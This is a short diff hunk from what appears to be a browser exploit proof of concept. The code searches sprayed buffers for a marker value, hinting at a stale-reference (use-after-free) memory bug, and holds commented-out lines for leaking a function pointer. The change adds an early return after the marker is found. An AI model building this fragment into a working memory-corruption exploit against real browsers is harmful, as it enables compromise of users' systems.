@@ -176,7 +176,8 @@ function go_() {
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				alert("Found the object!!");
-
+				return;
+				
 				// Leak function pointer
 				//stale[0] = fc;
 				//fcp = bufs[i][k];
